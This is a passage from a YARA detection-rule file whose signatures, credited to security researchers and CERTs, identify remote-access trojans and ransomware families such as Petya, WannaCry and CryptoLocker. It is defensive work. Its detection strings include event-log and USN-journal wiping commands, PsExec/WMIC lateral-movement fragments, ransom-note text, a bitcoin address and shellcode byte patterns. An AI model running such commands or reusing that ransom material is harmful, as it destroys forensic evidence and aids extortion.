$tmr7 = /(t)mrCountdown/
$tmr8 = /(t)mrCrazy/
$tmr9 = /(t)mrDOS/
$tmr10 = /(t)mrDoWork/
$tmr11 = /(t)mrFocus/
$tmr12 = /(t)mrGrabber/
$tmr13 = /(t)mrInaktivitet/
$tmr14 = /(t)mrInfoTO/
$tmr15 = /(t)mrIntervalUpdate/
$tmr16 = /(t)mrLiveLogger/
$tmr17 = /(t)mrPersistant/
$tmr18 = /(t)mrScreenshot/
$tmr19 = /(t)mrSpara/
$tmr20 = /(t)mrSprid/
$tmr21 = /(t)mrTCP/
$tmr22 = /(t)mrUDP/
$tmr23 = /(t)mrWebHide/
condition:
10 of ($mod*) or 10 of ($tmr*)
}
rule SSC_BlackShades_25052015
{
meta:
author = "Brian Wallace (@botnet_hunter)"
date = "2014/04"
ref = "http://malwareconfig.com/stats/PoisonIvy"
ref = "http://blog.cylance.com/a-study-in-bots-blackshades-net"
family = "blackshades"
strings:
$string1 = "bss_server"
$string2 = "txtChat"
$string3 = "UDPFlood"
condition:
all of them
}
rule SSC_Adzok : binary RAT Adzok
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
Description = "Adzok Rat"
Versions = "Free 1.0.0.3,"
date = "2015/05"
ref = "http://malwareconfig.com/stats/Adzok"
maltype = "Remote Access Trojan"
filetype = "jar"
strings:
$a1 = "config.xmlPK"
$a2 = "key.classPK"
$a3 = "svd$1.classPK"
$a4 = "svd$2.classPK"
$a5 = "Mensaje.classPK"
$a6 = "inic$ShutdownHook.class"
$a7 = "Uninstall.jarPK"
$a8 = "resources/icono.pngPK"
condition:
7 of ($a*)
}
rule SSC_CryptoLocker_set1
{
meta:
author = "Christiaan Beek, Christiaan_Beek@McAfee.com"
date = "2014-04-13"
description = "Detection of Cryptolocker Samples"
strings:
$string0 = "static"
$string1 = " kscdS"
$string2 = "Romantic"
$string3 = "CompanyName" wide
$string4 = "ProductVersion" wide
$string5 = "9%9R9f9q9"
$string6 = "IDR_VERSION1" wide
$string7 = "  </trustInfo>"
$string8 = "LookFor" wide
$string9 = ":n;t;y;"
$string10 = "        <requestedExecutionLevel level"
$string11 = "VS_VERSION_INFO" wide
$string12 = "2.0.1.0" wide
$string13 = "<assembly xmlns"
$string14 = "  <trustInfo xmlns"
$string15 = "srtWd@@"
$string16 = "515]5z5"
$string17 = "C:\\lZbvnoVe.exe" wide
condition:
12 of ($string*)
}
rule SSC_CryptoLocker_rule2
{
meta:
author = "Christiaan Beek, Christiaan_Beek@McAfee.com"
date = "2014-04-14"
description = "Detection of CryptoLocker Variants"
strings:
$string0 = "2.0.1.7" wide
$string1 = "    <security>"
$string2 = "Romantic"
$string3 = "ProductVersion" wide
$string4 = "9%9R9f9q9"
$string5 = "IDR_VERSION1" wide
$string6 = "button"
$string7 = "    </security>"
$string8 = "VFileInfo" wide
$string9 = "LookFor" wide
$string10 = "      </requestedPrivileges>"
$string11 = " uiAccess"
$string12 = "  <trustInfo xmlns"
$string13 = "last.inf"
$string14 = " manifestVersion"
$string15 = "FFFF04E3" wide
$string16 = "3,31363H3P3m3u3z3"
condition:
12 of ($string*)
}
rule SSC_Ransom_Satana
{
meta:
description = "Regla para detectar Ransom.Satana"
author = "CCN-CERT"
version = "1.0"
strings:
$a = { 21 00 73 00 61 00 74 00 61 00 6E 00 61 00 21 00 2E 00 74 00 78 00 74 00 00 }
$b = { 74 67 77 79 75 67 77 71 }
$c = { 53 77 76 77 6E 67 75 }
$d = { 45 6E 75 6D 4C 6F 63 61 6C 52 65 73 }
$e = { 57 4E 65 74 4F 70 65 6E 45 6E 75 6D 57 00 }
$f = { 21 53 41 54 41 4E 41 21 }
condition:
$b or $c and $d and $a and $e and $f
}
rule SSC_legion_777
{
meta:
author = "Daxda (https://github.com/Daxda)"
date = "2016/6/6"
description = "Detects an UPX-unpacked .777 ransomware binary."
ref = "https://github.com/Daxda/malware-analysis/tree/master/malware_samples/legion"
category = "Ransomware"
sample = "SHA256: 14d22359e76cf63bf17268cad24bac03663c8b2b8028b869f5cec10fe3f75548"
strings:
$s1 = "http://tuginsaat.com/wp-content/themes/twentythirteen/stats.php"
$s2 = "read_this_file.txt" wide // Ransom note filename.
$s3 = "seven_legion@india.com" // Part of the format string used to rename files.
$s4 = {46 4f 52 20 44 45 43 52 59 50 54 20 46 49 4c 45 53 0d 0a 53 45 4e 44 20 4f
4e 45 20 46 49 4c 45 20 49 4e 20 45 2d 4d 41 49 4c 0d 0a 73 65 76 65 6e 5f
6c 65 67 69 6f 6e 40 69 6e 64 69 61 2e 63 6f 6d } // Ransom note content.
$s5 = "%s._%02i-%02i-%02i-%02i-%02i-%02i_$%s$.777" // Renaming format string.
condition:
4 of ($s*)
}
rule SSC_Ransom_Satana_Dropper
{
meta:
description = "Regla para detectar el dropper de Ransom.Satana"
author = "CCN-CERT"
version = "1.0"
strings:
$a = { 25 73 2D 54 72 79 45 78 63 65 70 74 }
$b = { 64 3A 5C 6C 62 65 74 77 6D 77 79 5C 75 69 6A 65 75 71 70 6C 66 77 75 62 2E 70 64 62 }
$c = { 71 66 6E 74 76 74 68 62 }
condition:
all of them
}
rule SSC_Ransom_Alfa
{
meta:
description = "Regla para detectar W32/Filecoder.Alfa (Posibles falsos positivos)"
author = "CCN-CERT"
version = "1.0"
strings:
$a = { 8B 0C 97 81 E1 FF FF 00 00 81 F9 19 04 00 00 74 0F 81 F9 }
$b = { 22 04 00 00 74 07 42 3B D0 7C E2 EB 02 }
condition:
all of them
}
rule SSC_BackdoorFCKG: CTB_Locker_Ransomware
{
meta:
author = "ISG"
date = "2015-01-20"
reference = "https://blogs.mcafee.com/mcafee-labs/rise-backdoor-fckq-ctb-locker"
description = "CTB_Locker"
strings:
$string0 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$stringl = "RNDBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$string2 = "keme132.DLL"
$string3 = "klospad.pdb"
condition:
3 of them
}
rule SSC_SVG_LoadURL {
meta:
description = "Detects a tiny SVG file that loads an URL (as seen in CryptoWall malware infections)"
author = "Florian Roth"
reference = "http://goo.gl/psjCCc"
date = "2015-05-24"
hash1 = "ac8ef9df208f624be9c7e7804de55318"
hash2 = "3b9e67a38569ebe8202ac90ad60c52e0"
hash3 = "7e2be5cc785ef7711282cea8980b9fee"
hash4 = "4e2c6f6b3907ec882596024e55c2b58b"
score = 50
strings:
$s1 = "</svg>" nocase
$s2 = "<script>" nocase
$s3 = "location.href='http" nocase
condition:
all of ($s*) and filesize < 600
}
rule SSC_DMALocker4 : ransom {
meta:
Description = "Deteccion del ransomware DMA Locker version 4.0"
ref = "https://blog.malwarebytes.org/threat-analysis/2016/02/dma-locker-a-new-ransomware-but-no-reason-to-panic/"
Author = "SadFud"
Date = "30/05/2016"
Hash = "e3106005a0c026fc969b46c83ce9aeaee720df1bb17794768c6c9615f083d5d1"
strings:
$clave = { 21 44 4d 41 4c 4f 43 4b 34 2e 30 }
condition:
$clave
}
rule SSC_Win32Toxic : tox ransomware
{
meta:
author = "@GelosSnake"
date = "2015-06-02"
description = "https://blogs.mcafee.com/mcafee-labs/meet-tox-ransomware-for-the-rest-of-us"
hash0 = "70624c13be4d8a4c1361be38b49cb3eb"
hash1 = "4f20d25cd3ae2e5c63d451d095d97046"
hash2 = "e0473434cc83b57c4b579d585d4c4c57"
hash3 = "c52090d184b63e5cc71b524153bb079e"
hash4 = "7ac0b49baba9914b234cde62058c96a5"
hash5 = "048c007de4902b6f4731fde45fa8e6a9"
hash6 = "238ef3e35b14e304c87b9c62f18953a9"
hash7 = "8908ccd681f66429c578a889e6e708e1"
hash8 = "de9fe2b7d9463982cc77c78ee51e4d51"
hash9 = "37add8d26a35a3dc9700b92b67625fa4"
hash10 = "a0f30e89a3431fca1d389f90dba1d56e"
hash11 = "d4d0658302c731003bf0683127618bd9"
hash12 = "d1d89e1c7066f41c1d30985ac7b569db"
hash13 = "97d52d7281dfae8ff9e704bf30ce2484"
hash14 = "2cc85be01e86e0505697cf61219e66da"
hash15 = "02ecfb44b9b11b846ea8233d524ecda3"
hash16 = "703a6ebe71131671df6bc92086c9a641"
hash17 = "df23629b4a4aed05d6a453280256c05a"
hash18 = "07466ff2572f16c63e1fee206b081d11"
hash19 = "792a1c0971775d32bad374b288792468"
hash20 = "fb7fd5623fa6b7791a221fad463223cd"
hash21 = "83a562aab1d66e5d170f091b2ae6a213"
hash22 = "99214c8c9ff4653b533dc1b19a21d389"
hash23 = "a92aec198eee23a3a9a145e64d0250ee"
hash24 = "e0f7e6b96ca72b9755965b9dac3ce77e"
hash25 = "f520fc947a6d5edb87aa01510bee9c8d"
hash26 = "6d7babbe5e438539a9fa2c5d6128d3b4"
hash27 = "3133c2231fcee5d6b0b4c988a5201da1"
hash28 = "e5b1d198edc413376e0c0091566198e4"
hash29 = "50515b5a6e717976823895465d5dc684"
hash30 = "510389e8c7f22f2076fc7c5388e01220"
hash31 = "60573c945aa3b8cfaca0bdb6dd7d2019"
hash32 = "394187056697463eba97382018dfe151"
hash33 = "045a5d3c95e28629927c72cf3313f4cd"
hash34 = "70951624eb06f7db0dcab5fc33f49127"
hash35 = "5def9e3f7b15b2a75c80596b5e24e0f4"
hash36 = "35a42fb1c65ebd7d763db4abb26d33b0"
hash37 = "b0030f5072864572f8e6ba9b295615fc"
hash38 = "62706f48689f1ba3d1d79780010b8739"
hash39 = "be86183fa029629ee9c07310cd630871"
hash40 = "9755c3920d3a38eb1b5b7edbce6d4914"
hash41 = "cb42611b4bed97d152721e8db5abd860"
hash42 = "5475344d69fc6778e12dc1cbba23b382"
hash43 = "8c1bf70742b62dec1b350a4e5046c7b6"
hash44 = "6a6541c0f63f45eff725dec951ec90a7"
hash45 = "a592c5bee0d81ee127cbfbcb4178afe8"
hash46 = "b74c6d86ec3904f4d73d05b2797f1cc3"
hash47 = "28d76fd4dd2dbfc61b0c99d2ad08cd8e"
hash48 = "fc859ae67dc1596ac3fdd79b2ed02910"
hash49 = "cb65d5e929da8ff5c8434fd8d36e5dfb"
hash50 = "888dd1acce29cd37f0696a0284ab740a"
hash51 = "0e3e231c255a5eefefd20d70c247d5f0"
hash52 = "e5ebe35d934106f9f4cebbd84e04534b"
hash53 = "3b580f1fa0c961a83920ce32b4e4e86d"
hash54 = "d807a704f78121250227793ea15aa9c4"
hash55 = "db462159bddc0953444afd7b0d57e783"
hash56 = "2ed4945fb9e6202c10fad0761723cb0e"
hash57 = "51183ab4fd2304a278e36d36b5fb990c"
hash58 = "65d602313c585c8712ea0560a655ddeb"
hash59 = "0128c12d4a72d14bb67e459b3700a373"
hash60 = "5d3dfc161c983f8e820e59c370f65581"
hash61 = "d4dd475179cd9f6180d5b931e8740ed6"
hash62 = "5dd3782ce5f94686448326ddbbac934c"
hash63 = "c85c6171a7ff05d66d497ad0d73a51ed"
hash64 = "b42dda2100da688243fe85a819d61e2e"
hash65 = "a5cf8f2b7d97d86f4d8948360f3db714"
hash66 = "293cae15e4db1217ea72581836a6642c"
hash67 = "56c3a5bae3cb1d0d315c1353ae67cf58"
hash68 = "c86dc1d0378cc0b579a11d873ac944e7"
hash69 = "54cef0185798f3ec1f4cb95fad4ddd7c"
hash70 = "eb2eff9838043b67e8024ccadcfe1a8f"
hash71 = "78778fe62ee28ef949eec2e7e5961ca8"
hash72 = "e75c5762471a490d49b79d01da745498"
hash73 = "1564d3e27b90a166a0989a61dc3bd646"
hash74 = "59ba111403842c1f260f886d69e8757d"
hash75 = "d840dfbe52a04665e40807c9d960cccc"
hash76 = "77f543f4a8f54ecf84b15da8e928d3f9"
hash77 = "bd9512679fdc1e1e89a24f6ebe0d5ad8"
hash78 = "202f042d02be4f6469ed6f2e71f42c04"
hash79 = "28f827673833175dd9094002f2f9b780"
hash80 = "0ff10287b4c50e0d11ab998a28529415"
hash81 = "644daa2b294c5583ce6aa8bc68f1d21f"
hash82 = "1c9db47778a41775bbcb70256cc1a035"
hash83 = "c203bc5752e5319b81cf1ca970c3ca96"
hash84 = "656f2571e4f5172182fc970a5b21c0e7"
hash85 = "c17122a9864e3bbf622285c4d5503282"
hash86 = "f9e3a9636b45edbcef2ee28bd6b1cfbb"
hash87 = "291ff8b46d417691a83c73a9d3a30cc9"
hash88 = "1217877d3f7824165bb28281ccc80182"
hash89 = "18419d775652f47a657c5400d4aef4a3"
hash90 = "04417923bf4f2be48dd567dfd33684e2"
hash91 = "31efe902ec6a5ab9e6876cfe715d7c84"
hash92 = "a2e4472c5097d7433b91d65579711664"
hash93 = "98854d7aba1874c39636ff3b703a1ed1"
hash94 = "5149f0e0a56b33e7bbed1457aab8763f"
hash95 = "7a4338193ce12529d6ae5cfcbb1019af"
hash96 = "aa7f37206aba3cbe5e11d336424c549a"
hash97 = "51cad5d45cdbc2940a66d044d5a8dabf"
hash98 = "85edb7b8dee5b60e3ce32e1286207faa"
hash99 = "34ca5292ae56fea78ba14abe8fe11f06"
hash100 = "154187f07621a9213d77a18c0758960f"
hash101 = "4e633f0478b993551db22afddfa22262"
hash102 = "5c50e4427fe178566cada96b2afbc2d4"
hash103 = "263001ac21ef78c31f4ca7ad2e7f191d"
hash104 = "53fd9e7500e3522065a2dabb932d9dc5"
hash105 = "48043dc55718eb9e5b134dac93ebb5f6"
hash106 = "ca19a1b85363cfed4d36e3e7b990c8b6"
hash107 = "41b5403a5443a3a84f0007131173c126"
hash108 = "6f3833bc6e5940155aa804e58500da81"
hash109 = "9bd50fcfa7ca6e171516101673c4e795"
hash110 = "6d52ba0d48d5bf3242cd11488c75b9a7"
hash111 = "c52afb663ff4165e407f53a82e34e1d5"
hash112 = "5a16396d418355731c6d7bb7b21e05f7"
hash113 = "05559db924e71cccee87d21b968d0930"
hash114 = "824312bf8e8e7714616ba62997467fa8"
hash115 = "dfec435e6264a0bfe47fc5239631903c"
hash116 = "3512e7da9d66ca62be3418bead2fb091"
hash117 = "7ad4df88db6f292e7ddeec7cf63fa2bc"
hash118 = "d512da73d0ca103df3c9e7c074babc99"
hash119 = "c622b844388c16278d1bc768dcfbbeab"
hash120 = "170ffa1cd19a1cecc6dae5bdd10efb58"
hash121 = "3a19c91c1c0baa7dd4a9def2e0b7c3e9"
hash122 = "3b7ce3ceb8d2b85ab822f355904d47ce"
hash123 = "a7bac2ace1f04a7ad440bd2f5f811edc"
hash124 = "66594a62d8c98e1387ec8deb3fe39431"
hash125 = "a1add9e5d7646584fd4140528d02e4c3"
hash126 = "11328bbf5a76535e53ab35315321f904"
hash127 = "048f19d79c953e523675e96fb6e417a9"
hash128 = "eb65fc2922eafd62defd978a3215814b"
hash129 = "51cc9987f86a76d75bf335a8864ec250"
hash130 = "a7f91301712b5a3cc8c3ab9c119530ce"
hash131 = "de976a5b3d603161a737e7b947fdbb9a"
hash132 = "288a3659cc1aec47530752b3a31c232b"
hash133 = "91da679f417040558059ccd5b1063688"
hash134 = "4ce9a0877b5c6f439f3e90f52eb85398"
hash135 = "1f9e097ff9724d4384c09748a71ef99d"
hash136 = "7d8a64a94e71a5c24ad82e8a58f4b7e6"
hash137 = "db119e3c6b57d9c6b739b0f9cbaeb6fd"
hash138 = "52c9d25179bf010a4bb20d5b5b4e0615"
hash139 = "4b9995578d51fb891040a7f159613a99"
sample_filetype = "exe"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "n:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t;<<t;<<t;<<t;<<t;<<t;<<t;<<t;<<t<<<t;<<t;<<t;<<"
$string1 = "t;<<t;<<t<<<t<<"
$string2 = ">>><<<"
condition:
2 of them
}
rule SSC_Ransom_Alpha
{
meta:
description = "Regla para detectar Ransom.Alpha (posibles falsos positivos)"
author = "CCN-CERT"
version = "1.0"
strings:
$a = { 52 00 65 00 61 00 64 00 20 00 4D 00 65 00 20 00 28 00 48 00 6F 00 77 00 20 00 44 00 65 00 63 }
condition:
$a
}
rule SSC_Ransom_Crypren {
meta:
weight = 1
Author = "@pekeinfo"
reference = "https://github.com/pekeinfo/DecryptCrypren"
strings:
$a = "won't be able to recover your files anymore.</p>"
$b = {6A 03 68 ?? ?? ?? ?? B9 74 F1 AE 00 E8 ?? ?? ?? ?? E8 ?? ?? ?? ?? 68 98 3A 00 00 FF D6 6A 00 68 ?? ?? ?? ?? 68 ?? ?? ?? ??}
$c = "Please restart your computer and wait for instructions for decrypting your files"
condition:
any of them
}
rule SSC_DMALocker : ransom
{
meta:
Description = "Deteccion del ransomware DMA Locker desde la version 1.0 a la 4.0"
ref = "https://blog.malwarebytes.org/threat-analysis/2016/02/dma-locker-a-new-ransomware-but-no-reason-to-panic/"
Author = "SadFud"
Date = "30/05/2016"
strings:
$uno = { 41 42 43 58 59 5a 31 31 }
$dos = { 21 44 4d 41 4c 4f 43 4b }
$tres = { 21 44 4d 41 4c 4f 43 4b 33 2e 30 }
$cuatro = { 21 44 4d 41 4c 4f 43 4b 34 2e 30 }
condition:
any of them
}
rule SSC_TeslaCrypt {
meta:
description = "Regla para detectar Tesla con md5"
author = "CCN-CERT"
version = "1.0"
strings:
$ = { 4E 6F 77 20 69 74 27 73 20 25 49 3A 25 4D 25 70 2E 00 00 00 76 61 6C 20 69 73 20 25 64 0A 00 00 }
condition:
all of them
}
rule SSC_DoublePulsarXor_Petya
{
meta:
description = "Rule to hit on the XORed DoublePulsar shellcode"
author = "Patrick Jones"
company = "Booz Allen Hamilton"
reference1 ="https://www.boozallen.com/s/insight/publication/the-petya-ransomware-outbreak.html"
reference2 = "https://www.boozallen.com/content/dam/boozallen_site/sig/pdf/white-paper/rollup-of-booz-allen-petya-research.pdf"
date = "2017-06-28"
hash = "027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745"
hash = "64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1"
strings:
$DoublePulsarXor_Petya = { FD 0C 8C 5C B8 C4 24 C5 CC CC CC 0E E8 CC 24 6B CC CC CC 0F 24 CD CC CC CC 27 5C 97 75 BA CD CC CC C3 FE }
condition:
$DoublePulsarXor_Petya
}
rule SSC_DoublePulsarDllInjection_Petya
{
meta:
description = "Rule to hit on the XORed DoublePulsar DLL injection shellcode"
author = "Patrick Jones"
company = "Booz Allen Hamilton"
reference1 ="https://www.boozallen.com/s/insight/publication/the-petya-ransomware-outbreak.html"
reference2 = "https://www.boozallen.com/content/dam/boozallen_site/sig/pdf/white-paper/rollup-of-booz-allen-petya-research.pdf"
date = "2017-06-28"
hash = "027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745"
hash = "64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1"
strings:
$DoublePulsarDllInjection_Petya = { 45 20 8D 93 8D 92 8D 91 8D 90 92 93 91 97 0F 9F 9E 9D 99 84 45 29 84 4D 20 CC CD CC CC 9B 84 45 03 84 45 14 84 45 49 CC 33 33 33 24 77 CC CC CC 84 45 49 C4 33 33 33 24 84 CD CC CC 84 45 49 DC 33 33 33 84 47 49 CC 33 33 33 84 47 41 }
condition:
$DoublePulsarDllInjection_Petya
}
rule SSC_ransomware_PetrWrap
{
meta:
copyright= "Kaspersky Lab"
description = "Rule to detect PetrWrap ransomware samples"
reference = "https://securelist.com/schroedingers-petya/78870/"
last_modified = "2017-06-27"
author = "Kaspersky Lab"
hash = "71B6A493388E7D0B40C83CE903BC6B04"
version = "1.0"
strings:
$a1 = "MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcqYLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgqCXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu" fullword wide
$a2 = ".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls" fullword wide
$a3 = "DESTROY ALL OF YOUR DATA PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED" fullword ascii
$a4 = "1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX" fullword ascii
$a5 = "wowsmith123456posteo.net." fullword wide
condition:
uint16(0) == 0x5A4D and filesize < 1000000 and any of them
}
rule SSC_Petya_Ransomware {
meta:
description = "Detects Petya Ransomware"
author = "Florian Roth"
reference = "http://www.heise.de/newsticker/meldung/Erpressungs-Trojaner-Petya-riegelt-den-gesamten-Rechner-ab-3150917.html"
date = "2016-03-24"
hash = "26b4699a7b9eeb16e76305d843d4ab05e94d43f3201436927e13b3ebafa90739"
strings:
$a1 = "<description>WinRAR SFX module</description>" fullword ascii
$s1 = "BX-Proxy-Manual-Auth" fullword wide
$s2 = "<!--The ID below indicates application support for Windows 10 -->" fullword ascii
$s3 = "X-HTTP-Attempts" fullword wide
$s4 = "@CommandLineMode" fullword wide
$s5 = "X-Retry-After" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 500KB and $a1 and 3 of ($s*)
}
rule SSC_FE_CPE_MS17_010_RANSOMWARE {
meta:version="1.1"
//filetype="PE"
author="Ian.Ahl@fireeye.com @TekDefense, Nicholas.Carr@mandiant.com @ItsReallyNick"
date="2017-06-27"
description="Probable PETYA ransomware using ETERNALBLUE, WMIC, PsExec"
reference = "https://www.fireeye.com/blog/threat-research/2017/06/petya-ransomware-spreading-via-eternalblue-exploit.html"
strings:
// DRIVE USAGE
$dmap01 = "\\\\.\\PhysicalDrive" nocase ascii wide
$dmap02 = "\\\\.\\PhysicalDrive0" nocase ascii wide
$dmap03 = "\\\\.\\C:" nocase ascii wide
$dmap04 = "TERMSRV" nocase ascii wide
$dmap05 = "\\admin$" nocase ascii wide
$dmap06 = "GetLogicalDrives" nocase ascii wide
$dmap07 = "GetDriveTypeW" nocase ascii wide
// RANSOMNOTE
$msg01 = "WARNING: DO NOT TURN OFF YOUR PC!" nocase ascii wide
$msg02 = "IF YOU ABORT THIS PROCESS" nocase ascii wide
$msg03 = "DESTROY ALL OF YOUR DATA!" nocase ascii wide
$msg04 = "PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED" nocase ascii wide
$msg05 = "your important files are encrypted" ascii wide
$msg06 = "Your personal installation key" nocase ascii wide
$msg07 = "worth of Bitcoin to following address" nocase ascii wide
$msg08 = "CHKDSK is repairing sector" nocase ascii wide
$msg09 = "Repairing file system on " nocase ascii wide
$msg10 = "Bitcoin wallet ID" nocase ascii wide
$msg11 = "wowsmith123456@posteo.net" nocase ascii wide
$msg12 = "1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX" nocase ascii wide
$msg_pcre = /(en|de)crypt(ion|ed\.)/
// FUNCTIONALITY, APIS
$functions01 = "need dictionary" nocase ascii wide
$functions02 = "comspec" nocase ascii wide
$functions03 = "OpenProcessToken" nocase ascii wide
$functions04 = "CloseHandle" nocase ascii wide
$functions05 = "EnterCriticalSection" nocase ascii wide
$functions06 = "ExitProcess" nocase ascii wide
$functions07 = "GetCurrentProcess" nocase ascii wide
$functions08 = "GetProcAddress" nocase ascii wide
$functions09 = "LeaveCriticalSection" nocase ascii wide
$functions10 = "MultiByteToWideChar" nocase ascii wide
$functions11 = "WideCharToMultiByte" nocase ascii wide
$functions12 = "WriteFile" nocase ascii wide
$functions13 = "CoTaskMemFree" nocase ascii wide
$functions14 = "NamedPipe" nocase ascii wide
$functions15 = "Sleep" nocase ascii wide // imported, not in strings
// COMMANDS
//  -- Clearing event logs & USNJrnl
$cmd01 = "wevtutil cl Setup" ascii wide nocase
$cmd02 = "wevtutil cl System" ascii wide nocase
$cmd03 = "wevtutil cl Security" ascii wide nocase
$cmd04 = "wevtutil cl Application" ascii wide nocase
$cmd05 = "fsutil usn deletejournal" ascii wide nocase
// -- Scheduled task
$cmd06 = "schtasks " nocase ascii wide
$cmd07 = "/Create /SC " nocase ascii wide
$cmd08 = " /TN " nocase ascii wide
$cmd09 = "at %02d:%02d %ws" nocase ascii wide
$cmd10 = "shutdown.exe /r /f" nocase ascii wide
// -- Sysinternals/PsExec and WMIC
$cmd11 = "-accepteula -s" nocase ascii wide
$cmd12 = "wmic"
$cmd13 = "/node:" nocase ascii wide
$cmd14 = "process call create" nocase ascii wide
condition:
// (uint16(0) == 0x5A4D)
3 of ($dmap*)
and 2 of ($msg*)
and 9 of ($functions*)
and 7 of ($cmd*)
}
rule SSC_Ransom_Petya {
meta:
description = "Regla para detectar Ransom.Petya con md5 AF2379CC4D607A45AC44D62135FB7015"
author = "CCN-CERT"
version = "1.0"
strings:
$a1 = { C1 C8 14 2B F0 03 F0 2B F0 03 F0 C1 C0 14 03 C2 }
$a2 = { 46 F7 D8 81 EA 5A 93 F0 12 F7 DF C1 CB 10 81 F6 }
$a3 = { 0C 88 B9 07 87 C6 C1 C3 01 03 C5 48 81 C3 A3 01 00 00 }
condition:
all of them
}
rule SSC_WannaDecryptor: WannaDecryptor
{
meta:
description = "Detection for common strings of WannaDecryptor"
strings:
$id1 = "taskdl.exe"
$id2 = "taskse.exe"
$id3 = "r.wnry"
$id4 = "s.wnry"
$id5 = "t.wnry"
$id6 = "u.wnry"
$id7 = "msg/m_"
condition:
3 of them
}
rule SSC_Wanna_Cry_Ransomware_Generic {
meta:
description = "Detects WannaCry Ransomware on Disk and in Virtual Page"
author = "US-CERT Code Analysis Team"
reference = "not set"
date = "2017/05/12"
hash0 = "4DA1F312A214C07143ABEEAFB695D904"
strings:
$s0 = {410044004D0049004E0024}
$s1 = "WannaDecryptor"
$s2 = "WANNACRY"
$s3 = "Microsoft Enhanced RSA and AES Cryptographic"
$s4 = "PKS"
$s5 = "StartTask"
$s6 = "wcry@123"
$s7 = {2F6600002F72}
$s8 = "unzip 0.15 Copyrigh"
$s9 = "Global\\WINDOWS_TASKOSHT_MUTEX"
$s10 = "Global\\WINDOWS_TASKCST_MUTEX"
$s11 = {7461736B736368652E657865000000005461736B5374617274000000742E776E7279000069636163}
$s12 = {6C73202E202F6772616E742045766572796F6E653A46202F54202F43202F5100617474726962202B68}
$s13 = "WNcry@2ol7"
$s14 = "wcry@123"
$s15 = "Global\\MsWinZonesCacheCounterMutexA"
condition:
$s0 and $s1 and $s2 and $s3 or $s4 and $s5 and $s6 and $s7 or $s8 and $s9 and $s10 or $s11 and $s12 or $s13 or $s14 or $s15
}
rule SSC_WannaCry_Ransomware_Gen {
meta:
description = "Detects WannaCry Ransomware"
author = "Florian Roth (based on rule by US CERT)"
reference = "https://www.us-cert.gov/ncas/alerts/TA17-132A"
date = "2017-05-12"
hash1 = "9fe91d542952e145f2244572f314632d93eb1e8657621087b2ca7f7df2b0cb05"
hash2 = "8e5b5841a3fe81cade259ce2a678ccb4451725bba71f6662d0cc1f08148da8df"
hash3 = "4384bf4530fb2e35449a8e01c7e0ad94e3a25811ba94f7847c1e6612bbb45359"
strings:
$s1 = "__TREEID__PLACEHOLDER__" fullword ascii
$s2 = "__USERID__PLACEHOLDER__" fullword ascii
$s3 = "Windows for Workgroups 3.1a" fullword ascii
$s4 = "PC NETWORK PROGRAM 1.0" fullword ascii
$s5 = "LANMAN1.0" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 5000KB and all of them
}
rule SSC_lazaruswannacry {
meta:
description = "Rule based on shared code between Feb 2017 Wannacry sample and Lazarus backdoor from Feb 2015 discovered by Neel Mehta"
date = "2017-05-15"
reference = "https://twitter.com/neelmehta/status/864164081116225536"
author = "Costin G. Raiu, Kaspersky Lab"
version = "1.0"
hash = "9c7c7149387a1c79679a87dd1ba755bc"
hash = "ac21c8ad899727137c4b94458d7aa8d8"
strings:
$a1 = { 51 53 55 8B 6C 24 10 56 57 6A 20 8B 45 00 8D 75 04 24 01 0C 01 46 89 45 00 C6 46 FF 03 C6 06 01 46 56 E8 }
$a2 = { 03 00 04 00 05 00 06 00 08 00 09 00 0A 00 0D 00 10 00 11 00 12 00 13 00 14 00 15 00 16 00 2F 00 30 00 31 00 32 00 33 00 34 00 35 00 36 00 37 00 38 00 39 00 3C 00 3D 00 3E 00 3F 00 40 00 41 00 44 00 45 00 46 00 62 00 63 00 64 00 66 00 67 00 68 00 69 00 6A 00 6B 00 84 00 87 00 88 00 96 00 FF 00 01 C0 02 C0 03 C0 04 C0 05 C0 06 C0 07 C0 08 C0 09 C0 0A C0 0B C0 0C C0 0D C0 0E C0 0F C0 10 C0 11 C0 12 C0 13 C0 14 C0 23 C0 24 C0 27 C0 2B C0 2C C0 FF FE }
condition:
uint16(0) == 0x5A4D and filesize < 15000000 and all of them
}
rule SSC_Wanna_Sample_4da1f312a214c07143abeeafb695d904: Wanna_Sample_4da1f312a214c07143abeeafb695d904
{
meta:
description = "Specific sample match for WannaCryptor"
MD5 = "4da1f312a214c07143abeeafb695d904"
SHA1 = "b629f072c9241fd2451f1cbca2290197e72a8f5e"
SHA256 = "aee20f9188a5c3954623583c6b0e6623ec90d5cd3fdec4e1001646e27664002c"
INFO = "Looks for offsets of r.wry and s.wry instances"
strings:
$rwnry = { 72 2e 77 72 79 }
$swnry = { 73 2e 77 72 79 }
condition:
